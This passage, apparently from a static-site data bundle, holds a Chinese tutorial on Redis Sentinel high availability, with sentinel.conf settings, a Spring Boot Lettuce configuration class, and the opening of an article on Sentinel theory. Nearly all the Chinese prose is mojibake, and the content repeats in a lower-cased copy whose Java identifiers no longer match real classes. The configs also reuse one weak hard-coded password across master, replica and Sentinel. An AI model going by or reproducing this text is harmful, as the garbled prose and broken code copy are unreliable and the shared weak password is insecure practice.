slave-serve-stale-data éé¡¹çè¯´æï¼ï¼ é£ä¹ä½ å¯è½ä¸å¸æææä»æå¡å¨é½å¨åä¸æ¶é´åæ°çä¸»æå¡å¨åéåæ­¥è¯·æ±ï¼ å ä¸ºå°½ç®¡å¤å¶è¿ç¨çç»å¤§é¨åæ­¥éª¤é½ä¸ä¼é»å¡ä»æå¡å¨ï¼ ä½ä»æå¡å¨å¨è½½å¥ä¸»æå¡å¨åæ¥ç RDB æä»¶æ¶ï¼ ä»ç¶ä¼é æä»æå¡å¨å¨ä¸æ®µæ¶é´åä¸è½å¤çå½ä»¤è¯·æ±ï¼ å¦æå¨é¨ä»æå¡å¨ä¸èµ·å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ é£ä¹å°±å¯è½ä¼é æææä»æå¡å¨å¨ç­æ¶é´åå¨é¨ä¸å¯ç¨çæåµåºç°ã\n   ä½ å¯ä»¥éè¿å°è¿ä¸ªå¼è®¾ä¸º 1 æ¥ä¿è¯æ¯æ¬¡åªæä¸ä¸ªä»æå¡å¨å¤äºä¸è½å¤çå½ä»¤è¯·æ±çç¶æã\n\n * sentinel auth-pass mymaster ilovejj\n   éç½®å¯ç \n\n\n# å¨åµå¯å¨\n\næè¿éå¨åµå redis å®ä¾æ¯åä¸å°ï¼ææå°±æ¯å¯ä»¥ä¸èµ·ä½¿ç¨ï¼ä¸éè¦å¨é¨ç½²ä¸ä¸ªå¨åµã\n\n./redis-server ../sentinel.conf --sentinel\n\n\n1\n\n\nå¯å¨åè®°å¾æ¥çæ¥å¿ï¼ä¸äºä¸ä¸ºäººç¥çéç½®éè¯¯é½ä¼å¨æ¥å¿éé¢æ¾ç¤ºãå¶ä¸­ä¼æä¸å°ä¸ç´è¾åºåå¶ä»å¨åµè¿æ¥çä¿¡æ¯ã\n\n\n# spring boot redis å¨åµ\n\nmavenï¼åªæ¾å³äº Redis ç\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n        </dependency>\n        \n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\néç½®æä»¶\n\nspring\n  redis:\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ilovejj\n      master: mymaster\n      # è¿æ¯ææ¡æ¶èªå·±å¾ä¸ä¸ªå±æ§å¤§å®¶å¿½ç¥\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\néç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.RedisSentinelConfiguration;\nimport org.springframework.data.redis.connection.lettuce.LettuceClientConfiguration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.connection.lettuce.LettucePoolingClientConfiguration;\n\nimport java.util.HashSet;\n\n/**\n * @author big uncle\n * @date 2020/11/17 11:57\n * @module\n **/\n@Configuration\n@Slf4j\n@ConditionalOnExpression("${spring.redis.sentinel.enable:false}")\npublic class RedisSentinelConfig {\n\n\n    @Autowired\n    RedisProperties redisProperties;\n\n    /**\n     * GenericObjectPoolConfig è¿æ¥æ± éç½®\n     */\n    @Bean\n    public GenericObjectPoolConfig genericObjectPoolConfig() {\n        GenericObjectPoolConfig genericObjectPoolConfig = new GenericObjectPoolConfig();\n        genericObjectPoolConfig.setMaxIdle(redisProperties.getLettuce().getPool().getMaxIdle());\n        genericObjectPoolConfig.setMinIdle(redisProperties.getLettuce().getPool().getMinIdle());\n        genericObjectPoolConfig.setMaxTotal(redisProperties.getLettuce().getPool().getMaxActive());\n        genericObjectPoolConfig.setMaxWaitMillis(redisProperties.getLettuce().getPool().getMaxWait().toMillis());\n        return genericObjectPoolConfig;\n    }\n\n    /**\n     * å¨åµ\n    **/\n    @Bean\n    public LettuceConnectionFactory redisConnectionFactory(GenericObjectPoolConfig genericObjectPoolConfig) {\n        RedisSentinelConfiguration redisSentinelConfiguration = new RedisSentinelConfiguration(redisProperties.getSentinel().getMaster(),\n                new HashSet<>(redisProperties.getSentinel().getNodes()));\n        redisSentinelConfiguration.setPassword(redisProperties.getSentinel().getPassword());\n        // éç½®æ± \n        LettuceClientConfiguration clientConfig = LettucePoolingClientConfiguration.builder()\n                .commandTimeout(redisProperties.getTimeout())\n                .poolConfig(genericObjectPoolConfig)\n                .build();\n        LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(redisSentinelConfiguration,clientConfig);\n        log.debug("redis å¨åµå¯å¨");\n        return lettuceConnectionFactory;\n    }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n',normalizedContent:'# ç¯å¢\n\nèèå°æ¢ç¶æ¯é«å¯ç¨ï¼é£ä¹ sentinel ä¹å¾æ¯ä¸ä¸ªä»¥ä¸ã\n\nip               port    é¨ç½²\n192.168.81.101   6379    redis6 master\n192.168.81.101   26379   redis6 sentinel\n192.168.81.102   6379    redis6 slave\n192.168.81.102   26379   redis6 sentinel\n\n\n\n\n# ä¸»ä»æ­å»º\n\nä¸ºäºä¸»ä» redis å®å¨ï¼å¯ç æ¯å¿é¡»è®¾ç½®çï¼å¦åç­çè¢«æç¿å§ãå¨éç½®æä»¶ä¿®æ¹å¦ä¸ï¼\nä¸»ä»å¯ç å¯ä»¥ä¸æ ·ï¼æ¹ä¾¿è®°å¿ã\n\nrequirepass ilovejj\n\n\n1\n\n\nè®¾ç½®è¿æ¥ master æ¶çè®¤è¯å¯ç ï¼ä¸æ¬ç» slave çéç½®æä»¶è®¾ç½®\n\nmasterauth ilovejj\n\n\n1\n\n\né½å¯å¨æåä¹åå¨ slave ä½¿ç¨ä»¥ä¸å½ä»¤\n\n127.0.0.1:6379> slaveof 192.168.81.111 6379\nok\n\n\n1\n2\n\n\nå¯ä»¥ä»æ¥å¿éé¢çå°æ¯å¦å¯å¨æåï¼å¦ææ²¡æå¯å¨æååä¼ä¸ç´æå°å¦ä¸ï¼æè¿éææå¼ä¸ä¸ªéè¯¯ç ip å ä»¥è¯´æã\n\n2187:s 16 nov 2020 17:19:17.913 # error condition on socket for sync: operation now in progress\n2187:s 16 nov 2020 17:19:18.526 * connecting to master 192.168.81.111:6379\n2187:s 16 nov 2020 17:19:18.526 * master <-> replica sync started\n\n\n1\n2\n3\n\n\n> ä¸å®è¦è®°å¾å æ¥å¿ï¼å¦åä»¥åæä¹æ­»çé½ä¸ç¥éã\n\n\n# å¨åµ\n\nå¨ redis ç®å½ä¸ï¼èªå¸¦çä¸ä¸ª sentinel.cnf æä»¶ï¼æçç¸å³ sentinel éç½®ï¼æä»¬ä¿®æ¹å¦ä¸ï¼\n\n# ç«¯å£é»è®¤\nport 26379\ndaemonize yes\nlogfile "/opt/module/redis-6.0.8/log/sentinel.log"\nsentinel monitor mymaster 192.168.81.101 6379 2\nsentinel down-after-milliseconds mymaster 60000\nsentinel failover-timeout mymaster 180000\nsentinel parallel-syncs mymaster 1\nsentinel auth-pass mymaster ilovejj\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> åè®°å¨åµï¼ä¸å®è¦ç¨çæ¯ master ç ipï¼åªæå¨åä¸å°æå¡å¨ä¸ï¼ä¹è¦ä½¿ç¨ ipï¼ä¸è¦ä½¿ç¨ 127.0.0.1ï¼å¦åææä¸å°å¨åµï¼salve å¯è½æ æ³å¤å¶ã\n\n * daemonize yes é»è®¤ no\n   é»è®¤æ¯ noï¼æ¹ä¸º yes è®©å¨åå°è¿è¡\n\n * logfile "/opt/module/redis-6.0.8/log/sentinel.log"\n   é»è®¤ä¸è¾åºæ¥å¿ï¼ä¸å®è¦éç½®æ¥å¿ï¼å¦å...\n\n * sentinel monitor mymaster 192.168.81.101 6379 2\n   çè§ä¸ä¸ªåä¸º mymaster çä¸»æå¡å¨ï¼ è¿ä¸ªä¸»æå¡å¨ç ip å°åä¸º 192.168.81.101 ï¼ ç«¯å£å·ä¸º 6379 ï¼ èå°è¿ä¸ªä¸»æå¡å¨å¤æ­ä¸ºå¤±æè³å°éè¦ 2 ä¸ª sentinel åæãè¿éç mymaster åªæ¯ä¸ä¸ªå¿åï¼ä¾ä»¥ä¸éç½®ä½¿ç¨ã\n\n * sentinel down-after-milliseconds mymaster 60000 é»è®¤ 30000ms\n   å¦ææå¡å¨å¨ç»å®çæ¯«ç§æ°ä¹åï¼ æ²¡æè¿å sentinel åéç ping å½ä»¤çåå¤ï¼ æèè¿åä¸ä¸ªéè¯¯ï¼ é£ä¹ sentinel å°è¿ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ï¼subjectively downï¼ç®ç§° sdown ï¼ã\n   ä¸è¿åªæä¸ä¸ª sentinel å°æå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿å¹¶ä¸ä¸å®ä¼å¼èµ·æå¡å¨çèªå¨æéè¿ç§»ï¼ åªæå¨è¶³å¤æ°éç sentinel é½å°ä¸ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ä¹åï¼ æå¡å¨æä¼è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ï¼objectively downï¼ ç®ç§° odown ï¼ï¼ è¿æ¶èªå¨æéè¿ç§»æä¼æ§è¡ã\n   å°æå¡å¨æ è®°ä¸ºå®¢è§ä¸çº¿æéç sentinel æ°éç±å¯¹ä¸»æå¡å¨çéç½®å³å®ã\n\n * sentinel failover-timeout mymaster 180000 é»è®¤ 180000ms\n   æéè½¬ç§»æ¶é´\n\n * sentinel parallel-syncs mymaster 1 é»è®¤ 1\n   å¨æ§è¡æéè½¬ç§»æ¶ï¼ æå¤å¯ä»¥æå¤å°ä¸ªä»æå¡å¨åæ¶å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ è¿ä¸ªæ°å­è¶å°ï¼ å®ææéè½¬ç§»æéçæ¶é´å°±è¶é¿ã\n   å¦æä»æå¡å¨è¢«è®¾ç½®ä¸ºåè®¸ä½¿ç¨è¿ææ°æ®éï¼åè§å¯¹ redis.conf æä»¶ä¸­å¯¹ slave-serve-stale-data éé¡¹çè¯´æï¼ï¼ é£ä¹ä½ å¯è½ä¸å¸æææä»æå¡å¨é½å¨åä¸æ¶é´åæ°çä¸»æå¡å¨åéåæ­¥è¯·æ±ï¼ å ä¸ºå°½ç®¡å¤å¶è¿ç¨çç»å¤§é¨åæ­¥éª¤é½ä¸ä¼é»å¡ä»æå¡å¨ï¼ ä½ä»æå¡å¨å¨è½½å¥ä¸»æå¡å¨åæ¥ç rdb æä»¶æ¶ï¼ ä»ç¶ä¼é æä»æå¡å¨å¨ä¸æ®µæ¶é´åä¸è½å¤çå½ä»¤è¯·æ±ï¼ å¦æå¨é¨ä»æå¡å¨ä¸èµ·å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ é£ä¹å°±å¯è½ä¼é æææä»æå¡å¨å¨ç­æ¶é´åå¨é¨ä¸å¯ç¨çæåµåºç°ã\n   ä½ å¯ä»¥éè¿å°è¿ä¸ªå¼è®¾ä¸º 1 æ¥ä¿è¯æ¯æ¬¡åªæä¸ä¸ªä»æå¡å¨å¤äºä¸è½å¤çå½ä»¤è¯·æ±çç¶æã\n\n * sentinel auth-pass mymaster ilovejj\n   éç½®å¯ç \n\n\n# å¨åµå¯å¨\n\næè¿éå¨åµå redis å®ä¾æ¯åä¸å°ï¼ææå°±æ¯å¯ä»¥ä¸èµ·ä½¿ç¨ï¼ä¸éè¦å¨é¨ç½²ä¸ä¸ªå¨åµã\n\n./redis-server ../sentinel.conf --sentinel\n\n\n1\n\n\nå¯å¨åè®°å¾æ¥çæ¥å¿ï¼ä¸äºä¸ä¸ºäººç¥çéç½®éè¯¯é½ä¼å¨æ¥å¿éé¢æ¾ç¤ºãå¶ä¸­ä¼æä¸å°ä¸ç´è¾åºåå¶ä»å¨åµè¿æ¥çä¿¡æ¯ã\n\n\n# spring boot redis å¨åµ\n\nmavenï¼åªæ¾å³äº redis ç\n\n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-data-redis</artifactid>\n        </dependency>\n        \n        <dependency>\n            <groupid>org.apache.commons</groupid>\n            <artifactid>commons-pool2</artifactid>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\néç½®æä»¶\n\nspring\n  redis:\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ilovejj\n      master: mymaster\n      # è¿æ¯ææ¡æ¶èªå·±å¾ä¸ä¸ªå±æ§å¤§å®¶å¿½ç¥\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\néç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.pool2.impl.genericobjectpoolconfig;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.condition.conditionalonexpression;\nimport org.springframework.boot.autoconfigure.data.redis.redisproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.data.redis.connection.redissentinelconfiguration;\nimport org.springframework.data.redis.connection.lettuce.lettuceclientconfiguration;\nimport org.springframework.data.redis.connection.lettuce.lettuceconnectionfactory;\nimport org.springframework.data.redis.connection.lettuce.lettucepoolingclientconfiguration;\n\nimport java.util.hashset;\n\n/**\n * @author big uncle\n * @date 2020/11/17 11:57\n * @module\n **/\n@configuration\n@slf4j\n@conditionalonexpression("${spring.redis.sentinel.enable:false}")\npublic class redissentinelconfig {\n\n\n    @autowired\n    redisproperties redisproperties;\n\n    /**\n     * genericobjectpoolconfig è¿æ¥æ± éç½®\n     */\n    @bean\n    public genericobjectpoolconfig genericobjectpoolconfig() {\n        genericobjectpoolconfig genericobjectpoolconfig = new genericobjectpoolconfig();\n        genericobjectpoolconfig.setmaxidle(redisproperties.getlettuce().getpool().getmaxidle());\n        genericobjectpoolconfig.setminidle(redisproperties.getlettuce().getpool().getminidle());\n        genericobjectpoolconfig.setmaxtotal(redisproperties.getlettuce().getpool().getmaxactive());\n        genericobjectpoolconfig.setmaxwaitmillis(redisproperties.getlettuce().getpool().getmaxwait().tomillis());\n        return genericobjectpoolconfig;\n    }\n\n    /**\n     * å¨åµ\n    **/\n    @bean\n    public lettuceconnectionfactory redisconnectionfactory(genericobjectpoolconfig genericobjectpoolconfig) {\n        redissentinelconfiguration redissentinelconfiguration = new redissentinelconfiguration(redisproperties.getsentinel().getmaster(),\n                new hashset<>(redisproperties.getsentinel().getnodes()));\n        redissentinelconfiguration.setpassword(redisproperties.getsentinel().getpassword());\n        // éç½®æ± \n        lettuceclientconfiguration clientconfig = lettucepoolingclientconfiguration.builder()\n                .commandtimeout(redisproperties.gettimeout())\n                .poolconfig(genericobjectpoolconfig)\n                .build();\n        lettuceconnectionfactory lettuceconnectionfactory = new lettuceconnectionfactory(redissentinelconfiguration,clientconfig);\n        log.debug("redis å¨åµå¯å¨");\n        return lettuceconnectionfactory;\n    }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n',charsets:{cjk:!0}},{title:"Redisé«å¯ç¨(äº) å¨åµçè®º",frontmatter:{title:"Redisé«å¯ç¨(äº) å¨åµçè®º",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1608.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%BA%8C)%20%E5%93%A8%E5%85%B5%E7%90%86%E8%AE%BA.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1608.Redisé«å¯ç¨(äº) å¨åµçè®º.md",key:"v-bb3e121a",path:"/Redis/1608/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:2},{level:2,title:"æ¯ä¸ª Sentinel é½éè¦å®ææ§è¡çä»»å¡",slug:"æ¯ä¸ª-sentinel-é½éè¦å®ææ§è¡çä»»å¡",normalizedTitle:"æ¯ä¸ª sentinel é½éè¦å®ææ§è¡çä»»å¡",charIndex:776},{level:2,title:"èªå¨åç° Sentinel åä»æå¡å¨",slug:"èªå¨åç°-sentinel-åä»æå¡å¨",normalizedTitle:"èªå¨åç° sentinel åä»æå¡å¨",charIndex:1479},{level:2,title:"æéè½¬ç§»",slug:"æéè½¬ç§»",normalizedTitle:"æéè½¬ç§»",charIndex:716},{level:2,title:"Sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨",slug:"sentinel-èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨",normalizedTitle:"sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨",charIndex:3371},{level:2,title:"Sentinel ç¶æçæä¹å",slug:"sentinel-ç¶æçæä¹å",normalizedTitle:"sentinel ç¶æçæä¹å",charIndex:4032},{level:2,title:"Sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®",slug:"sentinel-å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®",normalizedTitle:"sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½®",charIndex:4205},{level:2,title:"TILT æ¨¡å¼",slug:"tilt-æ¨¡å¼",normalizedTitle:"tilt æ¨¡å¼",charIndex:4560},{level:2,title:"Sentinel å½ä»¤",slug:"sentinel-å½ä»¤",normalizedTitle:"sentinel å½ä»¤",charIndex:5287}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ç®ä» æ¯ä¸ª Sentinel é½éè¦å®ææ§è¡çä»»å¡ èªå¨åç° Sentinel åä»æå¡å¨ æéè½¬ç§» Sentinel èªå¨æéè¿ç§»çä¸è´æ§ç¹è´¨ Sentinel ç¶æçæä¹å Sentinel å¨éæéè¿ç§»çæåµä¸å¯¹å®ä¾è¿è¡éæ°éç½® TILT æ¨¡å¼ Sentinel å½ä»¤",content:"# ç®ä»\n\nRedis ç Sentinel ç³»ç»ç¨äºç®¡çå¤ä¸ª Redis æå¡å¨ï¼ è¯¥ç³»ç»æ§è¡ä»¥ä¸ä¸ä¸ªä»»å¡ï¼\n\n * çæ§ï¼Monitoringï¼ï¼ Sentinel ä¼ä¸æ­å°æ£æ¥ä½ ç master å slave æ¯å¦è¿ä½æ­£å¸¸ã\n * æéï¼Notificationï¼ï¼ å½è¢«çæ§çæä¸ª Redis æå¡å¨åºç°é®é¢æ¶ï¼ Sentinel å¯ä»¥éè¿ API åç®¡çåæèå¶ä»åºç¨ç¨åºåééç¥ã\n * èªå¨æéè¿ç§»ï¼Automatic failoverï¼ï¼ å½ä¸ä¸ª master ä¸è½æ­£å¸¸å·¥ä½æ¶ï¼ Sentinel ä¼å¼å§ä¸æ¬¡èªå¨æéè¿ç§»æä½ï¼ å®ä¼å°å¤±æ master çå¶ä¸­ä¸ä¸ª slave åçº§ä¸ºæ°ç masterï¼ å¹¶è®©å¤±æ master çå¶ä» slave æ¹ä¸ºå¤å¶æ°ç masterï¼ å½å®¢æ·ç«¯è¯å¾è¿æ¥å¤±æç master æ¶ï¼ éç¾¤ä¹ä¼åå®¢æ·ç«¯è¿åæ° master çå°åï¼ ä½¿å¾éç¾¤å¯ä»¥ä½¿ç¨æ° master ä»£æ¿å¤±ææå¡å¨ã\n\n\n\nå¨é»è®¤æåµä¸ï¼ Sentinel ä½¿ç¨ TCP ç«¯å£ 26379 ï¼æ®é Redis æå¡å¨ä½¿ç¨çæ¯ 6379 ï¼ã\n\nSentinel æ¥å Redis åè®®æ ¼å¼çå½ä»¤è¯·æ±ï¼ æä»¥ä½ å¯ä»¥ä½¿ç¨ redis-cli æèä»»ä½å¶ä» Redis å®¢æ·ç«¯æ¥ä¸ Sentinel è¿è¡éè®¯ã\n\næä¸¤ç§æ¹å¼å¯ä»¥å Sentinel è¿è¡éè®¯ï¼\n\n * ç¬¬ä¸ç§æ¹æ³æ¯éè¿ç´æ¥åéå½ä»¤æ¥æ¥è¯¢è¢«çè§ Redis æå¡å¨çå½åç¶æï¼ ä»¥å Sentinel æç¥éçå³äºå¶ä» Sentinel çä¿¡æ¯ï¼ è¯¸å¦æ­¤ç±»ã\n * å¦ä¸ç§æ¹æ³æ¯ä½¿ç¨åå¸ä¸è®¢éåè½ï¼ éè¿æ¥æ¶ Sentinel åéçéç¥ï¼ å½æ§è¡æéè½¬ç§»æä½ï¼ æèæä¸ªè¢«çè§çæå¡å¨è¢«å¤æ­ä¸ºä¸»è§ä¸çº¿æèå®¢è§ä¸çº¿æ¶ï¼ Sentinel å°±ä¼åéç¸åºçä¿¡æ¯ã\n\n\n# æ¯ä¸ª Sentinel é½éè¦å®ææ§è¡çä»»å¡\n\næ¯ä¸ª Sentinel ä»¥æ¯ç§éä¸æ¬¡çé¢çåå®æç¥ç master ãslave ä»¥åå¶ä» Sentinel å®ä¾åéä¸ä¸ª PING å½ä»¤ã\n\nå¦æä¸ä¸ªå®ä¾ï¼instanceï¼è·ç¦»æåä¸æ¬¡ææåå¤ PING å½ä»¤çæ¶é´è¶è¿ down-after-milliseconds éé¡¹ææå®çå¼ï¼ é£ä¹è¿ä¸ªå®ä¾ä¼è¢« Sentinel æ è®°ä¸ºä¸»è§ä¸çº¿ã ä¸ä¸ªææåå¤å¯ä»¥æ¯ï¼ +PONG ã -LOADING æè -MASTERDOWN ã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ é£ä¹æ­£å¨çè§è¿ä¸ª master çææ Sentinel è¦ä»¥æ¯ç§ä¸æ¬¡çé¢çç¡®è®¤ master çç¡®è¿å¥äºä¸»è§ä¸çº¿ç¶æã\n\nå¦æä¸ä¸ª master è¢«æ è®°ä¸ºä¸»è§ä¸çº¿ï¼ å¹¶ä¸æè¶³å¤æ°éç Sentinel ï¼è³å°è¦è¾¾å°éç½®æä»¶æå®çæ°éï¼å¨æå®çæ¶é´èå´ååæè¿ä¸å¤æ­ï¼ é£ä¹è¿ä¸ª master è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ã\n\nå¨ä¸è¬æåµä¸ï¼ æ¯ä¸ª Sentinel ä¼ä»¥æ¯ 10 ç§ä¸æ¬¡çé¢çåå®å·²ç¥çææ master å slave åé INFO å½ä»¤ã å½ä¸ä¸ª master è¢« Sentinel æ è®°ä¸ºå®¢è§ä¸çº¿æ¶ï¼ Sentinel åä¸çº¿ master çææ slave åé INFO å½ä»¤çé¢çä¼ä» 10 ç§ä¸æ¬¡æ¹ä¸ºæ¯ç§ä¸æ¬¡ã\n\nå½æ²¡æè¶³å¤æ°éç Sentinel åæ master å·²ç»ä¸çº¿ï¼ master çå®¢è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã å½ master éæ°å Sentinel ç PING å½ä»¤è¿åææåå¤æ¶ï¼ master çä¸»è§ä¸çº¿ç¶æå°±ä¼è¢«ç§»é¤ã\n\n\n# èªå¨åç° Sentinel åä»æå¡å¨\n\nä¸ä¸ª Sentinel å¯ä»¥ä¸å¶ä»å¤ä¸ª Sentinel è¿è¡è¿æ¥ï¼ åä¸ª Sentinel ä¹é´å¯ä»¥äºç¸æ£æ¥å¯¹æ¹çå¯ç¨æ§ï¼ å¹¶è¿è¡ä¿¡æ¯äº¤æ¢ã\n\nä½ æ é¡»ä¸ºè¿è¡çæ¯ä¸ª Sentinel åå«è®¾ç½®å¶ä» Sentinel çå°åï¼ å ä¸º Sentinel å¯ä»¥éè¿åå¸ä¸è®¢éåè½æ¥èªå¨åç°æ­£å¨çè§ç¸å master çå¶ä» Sentinel ï¼ è¿ä¸åè½æ¯éè¿åé¢é sentinel:hello åéä¿¡æ¯æ¥å®ç°çã\n\nä¸æ­¤ç±»ä¼¼ï¼ ä½ ä¹ä¸å¿æå¨ååº master å±ä¸çææ slave ï¼ å ä¸º Sentinel å¯ä»¥éè¿è¯¢é® master æ¥è·å¾ææ slave çä¿¡æ¯ã\n\næ¯ä¸ª Sentinel ä¼ä»¥æ¯ä¸¤ç§ä¸æ¬¡çé¢çï¼ éè¿åå¸ä¸è®¢éåè½ï¼ åè¢«å®çè§çææ master å slave ç sentinel:hello é¢éåéä¸æ¡ä¿¡æ¯ï¼ ä¿¡æ¯ä¸­åå«äº Sentinel ç IP å°åãç«¯å£å·åè¿è¡ ID ï¼runidï¼ã\n\næ¯ä¸ª Sentinel é½è®¢éäºè¢«å®çè§çææ master å slave ç sentinel:hello é¢éï¼ æ¥æ¾ä¹åæªåºç°è¿ç sentinel ï¼looking for unknown sentinelsï¼ã å½ä¸ä¸ª Sentinel åç°ä¸ä¸ªæ°ç Sentinel æ¶ï¼ å®ä¼å°æ°ç Sentinel æ·»å å°ä¸ä¸ªåè¡¨ä¸­ï¼ è¿ä¸ªåè¡¨ä¿å­äº Sentinel å·²ç¥çï¼ çè§åä¸ä¸ª master çææå¶ä» Sentinel ã\n\nSentinel åéçä¿¡æ¯ä¸­è¿åæ¬å®æ´ç master å½åéç½®ï¼configurationï¼ã å¦æä¸ä¸ª Sentinel åå«ç master éç½®æ¯å¦ä¸ä¸ª Sentinel åéçéç½®è¦æ§ï¼ é£ä¹è¿ä¸ª Sentinel ä¼ç«å³åçº§å°æ°éç½®ä¸ã\n\nå¨å°ä¸ä¸ªæ° Sentinel æ·»å å°çè§ master çåè¡¨ä¸é¢ä¹åï¼ Sentinel ä¼åæ£æ¥åè¡¨ä¸­æ¯å¦å·²ç»åå«äºåè¦æ·»å ç Sentinel æ¥æç¸åè¿è¡ ID æèç¸åå°åï¼åæ¬ IP å°ååç«¯å£å·ï¼ç Sentinel ï¼ å¦ææ¯çè¯ï¼ Sentinel ä¼åç§»é¤åè¡¨ä¸­å·²æçé£äºæ¥æç¸åè¿è¡ ID æèç¸åå°åç Sentinel ï¼ ç¶ååæ·»å æ° Sentinel ã\n\n\n# æéè½¬ç§»\n\nä¸æ¬¡æéè½¬ç§»æä½ç±ä»¥ä¸æ­¥éª¤ç»æï¼\n\n * åç° master å·²ç»è¿å¥å®¢è§ä¸çº¿ç¶æã\n * å¯¹æä»¬çå½å epoch å¼è¿è¡èªå¢ï¼ å¹¶å°è¯å¨è¿ä¸ª epoch å¼ä¸­å½éã\n * å¦æå½éå¤±è´¥ï¼ é£ä¹å¨è®¾å®çæéè¿ç§»è¶æ¶æ¶é´çä¸¤åä¹åï¼ éæ°å°è¯å½éã å¦æå½éæåï¼ é£ä¹æ§è¡ä»¥ä¸æ­¥éª¤ã\n * éåºä¸ä¸ª slaveï¼å¹¶å°å®åçº§ä¸º masterã\n * åè¢«éä¸­ç slave åéÂ  SLAVEOF NO ONE Â å½ä»¤ï¼è®©å®è½¬åä¸º masterã\n * éè¿åå¸ä¸è®¢éåè½ï¼ å°æ´æ°åçéç½®ä¼ æ­ç»ææå¶ä» Sentinel ï¼ å¶ä» Sentinel å¯¹å®ä»¬èªå·±çéç½®è¿è¡æ´æ°ã\n * åå·²ä¸çº¿ master ç slave åéÂ SLAVEOF å½ä»¤ï¼ è®©å®ä»¬å»å¤å¶æ°ç masterã\n * å½ææ slave é½å·²ç»å¼å§å¤å¶æ°ç master æ¶ï¼ é¢å¤´ Sentinel ç»æ­¢è¿æ¬¡æéè¿ç§»æä½ã\n\næ¯å½ä¸ä¸ª Redis å®ä¾è¢«éæ°éç½®ï¼reconfiguredï¼ ââ æ è®ºæ¯è¢«è®¾ç½®æ masterãslaveãåæèè¢«è®¾ç½®æå¶ä» master ç slave ââ Sentinel é½ä¼åè¢«éæ°éç½®çå®ä¾åéä¸ä¸ª CONFIG REWRITE å½ä»¤ï¼ ä»èç¡®ä¿è¿äºéç½®ä¼æä¹åå¨ç¡¬çéã\n\nSentinel ä½¿ç¨ä»¥ä¸è§åæ¥éæ©æ°ç masterï¼\n\n * å¨å¤±æ master å±ä¸ç slave å½ä¸­ï¼ é£äºè¢«æ è®°ä¸ºä¸»è§ä¸çº¿ãå·²æ­çº¿ãæèæåä¸æ¬¡åå¤Â PINGÂ 